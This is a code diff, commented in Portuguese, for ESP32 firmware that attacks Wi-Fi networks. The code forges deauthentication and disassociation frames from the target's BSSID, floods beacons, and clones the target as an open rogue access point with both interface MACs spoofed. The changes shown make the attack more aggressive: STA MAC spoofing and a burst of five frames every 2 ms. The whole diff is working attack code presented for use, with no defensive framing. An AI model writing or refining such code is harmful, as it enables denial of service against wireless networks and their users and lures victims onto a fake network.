@@ -20,6 +20,7 @@ static uint8_t  deauthTargetAuth = 0;
 // ============================================================
 static bool bssidCloneActive = false;
 static uint8_t originalAPMac[6] = {0};
+static uint8_t originalSTAMac[6] = {0};
 static uint8_t cloneChannel = 0;
 static char cloneSSID[33] = {0};
 static unsigned long cloneStartTime = 0;
@@ -27,7 +28,7 @@ static uint8_t cloneHealthCheckFailures = 0;
 
 // ============================================================
 // RAW FRAME DEAUTH
-// Envia pela WIFI_IF_AP para que o MAC de origem seja o BSSID spoofado
+// SPOOFA O MAC DA STA PARA O BSSID DO ALVO antes de enviar
 // ============================================================
 static uint16_t deauthSeqNum = 0;
 
@@ -35,39 +36,30 @@ static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     uint8_t frame[26];
     memset(frame, 0, 26);
 
-    // Frame Control: Deauthentication (0x00C0)
-    frame[0] = 0xC0;
+    frame[0] = 0xC0; // Deauth
     frame[1] = 0x00;
-
-    // Duration
     frame[2] = 0x00;
     frame[3] = 0x00;
 
-    // DA - Destination Address (cliente ou broadcast)
     if (clientMac) {
         memcpy(&frame[4], clientMac, 6);
     } else {
-        memset(&frame[4], 0xFF, 6); // Broadcast
+        memset(&frame[4], 0xFF, 6);
     }
 
-    // SA - Source Address = BSSID do AP alvo (spoofado no nosso AP)
-    memcpy(&frame[10], bssid, 6);
+    memcpy(&frame[10], bssid, 6); // SA = BSSID
+    memcpy(&frame[16], bssid, 6); // BSSID
 
-    // BSSID
-    memcpy(&frame[16], bssid, 6);
-
-    // Sequence Number
     frame[22] = (deauthSeqNum << 4) & 0xFF;
     frame[23] = (deauthSeqNum >> 4) & 0xFF;
     deauthSeqNum++;
     if (deauthSeqNum > 4095) deauthSeqNum = 0;
 
-    // Reason Code: 0x0007
-    frame[24] = 0x07;
+    frame[24] = 0x07; // Reason: Class 3 frame from nonassociated STA
     frame[25] = 0x00;
 
-    // ENVIA PELA INTERFACE AP (MAC ja esta spoofado para o BSSID alvo)
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
+    // Envia pela STA (MAC ja spoofado para o BSSID do alvo)
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
         deauthSuccessCount++;
@@ -78,7 +70,7 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     uint8_t frame[26];
     memset(frame, 0, 26);
 
-    frame[0] = 0xA0; // Disassociation
+    frame[0] = 0xA0; // Disassoc
     frame[1] = 0x00;
     frame[2] = 0x00;
     frame[3] = 0x00;
@@ -97,11 +89,10 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     deauthSeqNum++;
     if (deauthSeqNum > 4095) deauthSeqNum = 0;
 
-    frame[24] = 0x08;
+    frame[24] = 0x08; // Reason: STA leaving BSS
     frame[25] = 0x00;
 
-    // ENVIA PELA INTERFACE AP
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
         deauthSuccessCount++;
@@ -109,7 +100,7 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
 }
 
 // ============================================================
-// BEACON FLOOD
+// BEACON FLOOD - mais agressivo
 // ============================================================
 static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
     uint8_t beacon[128];
@@ -127,12 +118,16 @@ static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
     beacon[22] = 0x00;
     beacon[23] = 0x00;
 
+    // Timestamp (8 bytes) - zeros
+    // Beacon interval = 0x0064 (100 TU)
     beacon[32] = 0x64;
     beacon[33] = 0x00;
 
+    // Capability info = ESS
     beacon[34] = 0x01;
     beacon[35] = 0x00;
 
+    // SSID IE
     beacon[36] = 0x00;
     uint8_t ssidLen = strlen(ssid);
     if (ssidLen > 32) ssidLen = 32;
@@ -188,7 +183,7 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// BSSID CLONE - ROGUE AP
+// BSSID CLONE - ROGUE AP + STA MAC SPOOF
 // ============================================================
 static void startBssidClone(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -207,7 +202,9 @@ static void startBssidClone(uint8_t networkIndex) {
     strncpy(cloneSSID, target->ssid, 32);
     cloneSSID[32] = '\0';
 
+    // Salva MACs originais
     esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);
+    esp_wifi_get_mac(WIFI_IF_STA, originalSTAMac);
 
     Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
         target->ssid, target->channel,
@@ -217,13 +214,21 @@ static void startBssidClone(uint8_t networkIndex) {
     WiFi.softAPdisconnect(true);
     delay(400);
 
+    // MODO AP_STA
     WiFi.mode(WIFI_AP_STA);
     delay(300);
 
-    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
-    Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", macErr, macErr == ESP_OK ? "OK" : "FAIL");
+    // SPOOFA O MAC DA STA PARA O BSSID DO ALVO (ESSENCIAL!)
+    esp_err_t staMacErr = esp_wifi_set_mac(WIFI_IF_STA, target->bssid);
+    Serial.printf("[Clone] Set STA MAC result: %d (%s)\n", staMacErr, staMacErr == ESP_OK ? "OK" : "FAIL");
+    delay(100);
+
+    // SPOOFA O MAC DA AP PARA O BSSID DO ALVO
+    esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
+    Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
     delay(200);
 
+    // Inicia o AP
     bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     Serial.printf("[Clone] softAP result: %s\n", apOk ? "OK" : "FAIL");
@@ -236,7 +241,7 @@ static void startBssidClone(uint8_t networkIndex) {
         cloneStartTime = millis();
         cloneHealthCheckFailures = 0;
         
-        Serial.println("[Clone] BSSID CLONE ACTIVE");
+        Serial.println("[Clone] BSSID CLONE ACTIVE - BOTH interfaces spoofed");
     } else {
         Serial.println("[Clone] FAILED to start clone AP");
     }
@@ -252,6 +257,7 @@ static void restartBssidClone() {
     WiFi.mode(WIFI_AP_STA);
     delay(200);
     
+    esp_wifi_set_mac(WIFI_IF_STA, deauthTargetBSSID);
     esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
     delay(200);
     
@@ -274,6 +280,8 @@ static void stopBssidClone() {
     WiFi.softAPdisconnect(true);
     delay(400);
 
+    // Restaura MACs originais
+    esp_wifi_set_mac(WIFI_IF_STA, originalSTAMac);
     esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
     delay(200);
 
@@ -281,11 +289,11 @@ static void stopBssidClone() {
     delay(200);
 
     bssidCloneActive = false;
-    Serial.println("[Clone] BSSID clone stopped, MAC restored");
+    Serial.println("[Clone] BSSID clone stopped, MACs restored");
 }
 
 // ============================================================
-// DEAUTH - Raw frames + Rogue AP
+// DEAUTH
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -299,7 +307,7 @@ void startDeauth(uint8_t networkIndex) {
 
     startBssidClone(networkIndex);
 
-    Serial.println("[Deauth] STARTED (Raw Deauth + Rogue AP)");
+    Serial.println("[Deauth] STARTED (STA+AP spoofed)");
 }
 
 void stopDeauth() {
@@ -316,26 +324,22 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH
+// LOOP DE DEAUTH - burst agressivo
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    // === ENVIO CONTINUO - mais agressivo: 1ms entre bursts ===
-    static unsigned long lastDeauthTx = 0;
-    if (millis() - lastDeauthTx >= 1) {
-        lastDeauthTx = millis();
+    // === BURST: 5 frames a cada 2ms ===
+    static unsigned long lastBurst = 0;
+    if (millis() - lastBurst >= 2) {
+        lastBurst = millis();
 
-        static uint8_t txRound = 0;
-        txRound++;
-
-        if (txRound % 3 == 0) {
-            sendDeauthFrame(deauthTargetBSSID, nullptr);
-        } else if (txRound % 3 == 1) {
-            sendDisassocFrame(deauthTargetBSSID, nullptr);
-        } else {
-            sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID);
-        }
+        // Burst rapido: deauth x2 + disassoc x2 + beacon x1
+        sendDeauthFrame(deauthTargetBSSID, nullptr);
+        sendDeauthFrame(deauthTargetBSSID, nullptr);
+        sendDisassocFrame(deauthTargetBSSID, nullptr);
+        sendDisassocFrame(deauthTargetBSSID, nullptr);
+        sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID);
     }
 
     // === HEALTH CHECK a cada 3 segundos ===
